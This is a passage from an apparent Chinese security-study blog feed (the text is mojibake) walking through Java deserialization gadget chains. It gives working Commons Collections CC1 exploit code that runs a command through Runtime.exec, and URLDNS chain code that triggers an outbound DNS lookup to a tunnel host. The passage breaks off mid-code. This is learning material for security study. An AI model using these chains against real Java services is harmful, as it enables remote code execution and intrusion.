class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡"><a href="#è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡" class="headerlink" title="è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡"></a>è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡</h3><p>è¿™é‡Œæ‰¾åˆ°ConstantTransfomerï¼Œçœ‹å®ƒé‡Œé¢çš„ä¸¤ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149259.png" alt="image-20230426214930163"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iConstant = constantToReturn;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformæ–¹æ³•è¿”å›æ„é€ å‡½æ•°ä¸­ä¼ å…¥çš„å‚æ•°ï¼Œé‚£ä¹ˆæ§åˆ¶å…¶è¿”å›Runtime.classå°±è§£å†³äº†è¿™ä¸ªé—®é¢˜<br>æ‰€ä»¥ç°åœ¨payloadä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">map.put(<span class="string">&quot;kkk&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHdConstructor</span> <span class="operator">=</span>  c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,Map.class&#125;);  <span class="comment">//è·å–ç±»çš„æ„é€ æ–¹æ³•  </span></span><br><span class="line">annotationInvocationHdConstructor.setAccessible(<span class="literal">true</span>); <span class="comment">//ä¿è¯å¯ä»¥è®¿é—®  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHdConstructor.newInstance(Override.class, transformedMap);  </span><br><span class="line">serialize(o);  </span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="è§£å†³ä¸¤ä¸ªifé—®é¢˜"><a href="#è§£å†³ä¸¤ä¸ªifé—®é¢˜" class="headerlink" title="è§£å†³ä¸¤ä¸ªifé—®é¢˜"></a>è§£å†³ä¸¤ä¸ªifé—®é¢˜</h3><p>é€šè¿‡è°ƒè¯•å‘ç°ï¼Œè¿™é‡Œä¸ä¼šè¿›å…¥ifä¼šç›´æ¥è·³è¿‡setValue<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149733.png" alt="image-20230426214954634"><br>æˆ‘ä»¬å¾€ä¸Šåˆ†æä¸€ä¸‹memberTypeçš„æ¥æºçœ‹çœ‹å®ƒçš„ä½œç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150959.png" alt="image-20230426215001865"><br>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯è·å–ä¼ å‚ä¸­æ³¨è§£çš„æˆå‘˜æ–¹æ³•ï¼Œæ‰€ä»¥memberTypeä¸èƒ½ä¸ºç©ºå³æ³¨è§£çš„æˆå‘˜æ–¹æ³•ä¸èƒ½ä¸ºç©ºï¼Œç„¶åå»æ‰¾ä¼ å…¥çš„æ³¨è§£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150779.png" alt="image-20230426215011729"><br>å¯ä»¥çœ‹åˆ°æ³¨è§£ä¸ºOverrideï¼Œç‚¹è¿›å»çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150156.png" alt="image-20230426215022091"><br>ä¸ºç©ºï¼Œæ‰€ä»¥è¿™ä¸ªæ³¨è§£ä¸è¡Œï¼Œç”¨<code>Target.class</code> å°è¯•ä¸€ä¸‹ï¼Œç‚¹è¿› <code>Target</code>ï¼Œå½“ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ä¸º <code>value</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ <code>hashmap.put</code> ä¹Ÿéœ€è¦ä¿®æ”¹ä¸º <code>value</code>ï¼Œå› ä¸ºç¬¬äºŒä¸ªifå°±æ˜¯åˆ¤æ–­æˆå‘˜å˜é‡ä¸hashMapä¼ å…¥çš„å‚æ•°æ˜¯å¦ç›¸ç­‰ï¼Œä¿®æ”¹å®Œä¹‹ååˆ°ç»“æŸäº†</p><h3 id="æœ€ç»ˆEXP"><a href="#æœ€ç»ˆEXP" class="headerlink" title="æœ€ç»ˆEXP"></a>æœ€ç»ˆEXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorateMap);  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151916.png" alt="image-20230426215110821"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>çœ‹ä¸€ä¸‹æ•´ä¸ªçš„åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransfomer#transform</span><br><span class="line">   TransformedMap#checkSetValue</span><br><span class="line">      AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">         AnnotationInvocation#readObject</span><br><span class="line"></span><br><span class="line">è¾…åŠ©åˆ©ç”¨é“¾</span><br><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure><p>æµç¨‹å›¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151401.png" alt="image-20230426215124329"><br>æ„Ÿè§‰è·Ÿå®Œè¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨ï¼Œè¿˜æ˜¯å¾—å®é™…è¿ç”¨ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹URLDNSé“¾</title>
      <link href="/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ”¾ä»£ç ï¼Œæ„Ÿè§‰è¿˜æ˜¯è‡ªå·±è·Ÿç€è§†é¢‘æ‰‹å†™ä¸€éæ›´å¥½ç†è§£ï¼Œå¾ˆå¤šç†è§£æ”¾åœ¨æ³¨é‡Šä¸­äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//å…¥å£ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//è°ƒç”¨é“¾ä¸­çš„ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://vnmkzfpuho.dnstunnel.run&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//é€šè¿‡åå°„è·å–åˆ°urlä¸­çš„hashcodeå±æ€§  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">        <span class="comment">//hashcodeä¸ºç§æœ‰å±æ€§ï¼Œé€šè¿‡ä¸‹é¢æ–¹æ³•è®¾ç½®ä¸ºå¯æ“ä½œ  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåœ¨putå‰éœ€è¦å°†hashCodeå€¼æ”¹ä¸€ä¸‹ï¼Œä¸ç„¶putæ–¹æ³•ä¹Ÿä¼šè¯·æ±‚dnsï¼Œè¿™æ ·ä¸ç®¡æœ‰æ²¡æœ‰ååºåˆ—åŒ–éƒ½ä¼šè¯·æ±‚dns  </span></span><br><span class="line">  </span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//é‡æ–°è®¾ï¼Œé¿å…æ··æ·†  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//æ”¹å›ï¼Œä¸ç„¶è¿™æ¡é“¾å°±ä¸èƒ½åˆ©ç”¨  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿›è¡Œåºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        w.writeObject(hashMap);  </span><br><span class="line">        System.out.println(w);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿›è¡Œååºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        o.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>çœ‹ä¸€ä¸‹å¤§ä½¬æ€»ç»“çš„åŸç†<br><em><strong>java.util.HashMap é‡å†™äº† readObject, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ hash å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ java.net.URL çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ getHostAddress æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</strong></em></p><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>è¿›å…¥åˆ°hashMapç±»ä¸­å¯ä»¥çœ‹åˆ°å®ƒæœ‰åºåˆ—åŒ–çš„æ¥å£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232239690.png" alt="image-20230422211906952"><br>å¹¶ä¸”é‡å†™äº†readObjectï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–æ•°æ®ï¼Œåœ¨Javaä¸­ï¼Œå¦‚æœreadObjectè¢«é‡å†™é‚£ä¹ˆé¦–å…ˆä¼šè°ƒç”¨é‡å†™çš„readObjectï¼Œä¸‹é¢è¿™é‡Œçš„sä¸ºè¾“å…¥æµè¯æ˜å¯æ§<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242194.png" alt="image-20230423224233141"><br>å¼€å§‹è°ƒè¯•ï¼Œé¦–å…ˆç›´æ¥åœ¨ä¸‹é¢è¿™é‡Œè¿›å…¥hashMapç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242993.png" alt="image-20230423224245956"><br>ç„¶åæ‰¾åˆ°readObjectæ–¹æ³•åœ¨putVal()æ–¹æ³•ä½ç½®ä¸‹æ–­ç‚¹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242372.png" alt="image-20230423224257331"><br>è¿™é‡Œhash()æ–¹æ³•å¯¹keyå€¼é‡æ–°è¿›è¡Œäº†è®¡ç®—è€Œkeyå€¼ä¸ºURLç±»çš„å¯¹è±¡ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243955.png" alt="image-20230423224317914"><br>hash()æ–¹æ³•é‡Œé¢è°ƒç”¨äº†hashCode()æ–¹æ³•ï¼Œè¿™é‡Œkeyæ˜¯URLçš„å¯¹è±¡æ‰€ä»¥è¿™é‡Œçš„hashCodeæ–¹æ³•æ˜¯URLç±»ä¸­çš„ï¼Œè¿™é‡Œè°ƒè¯•çš„æ—¶å€™ä¸€å®šè¦åˆ°keyä¸ºURLå¯¹è±¡åæ‰èƒ½è¿›å…¥URLç±»ä¸­hashCode()æ–¹æ³•ï¼Œä¸ç„¶è¿›å…¥çš„å°±æ˜¯Objectä¸­çš„hashCode()æ–¹æ³•ï¼Œå¯¹äºå°ç™½è¿™é‡Œå¾ˆå®¹æ˜“è¿·ç³Šï¼Œæ¯”å¦‚æˆ‘ï¼Œç»§ç»­è·Ÿè¿›<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243515.png" alt="image-20230423224330461"><br>æ¥åˆ°äº†URLçš„hashCode()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå€¼ä¸ä¸º-1çš„è¯å°±ç›´æ¥è¿”å›äº†ï¼Œæ‰€ä»¥å€¼å¿…é¡»ä¸º-1ï¼Œåœ¨è¿™ä¸ªç±»ä¸­å®ƒçš„å€¼å·²ç»åˆå§‹åŒ–å¥½äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243334.png"><br>ç»§ç»­åˆ†æï¼Œä¸‹é¢è¿™é‡Œå¯¹hashCodeè¿›è¡Œäº†å¤„ç†ï¼Œè·Ÿè¿›handlerå¯¹è±¡çš„hashCode()æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243350.png"><br>å¯ä»¥çœ‹åˆ°handleræ˜¯URLStreamHandlerçš„å¯¹è±¡<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244392.png" alt="image-20230423224413351"><br>å¯ä»¥çœ‹åˆ°åœ¨å¯¹hashCodeè¿›è¡Œå¤„ç†æ—¶è°ƒç”¨äº†getHostAddress()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–IPåœ°å€<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244708.png" alt="image-20230423224436669"><br>è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥è´´ä¸€ä½å¤§ä½¬å¸¦æœ‰æ³¨é‡Šçš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span 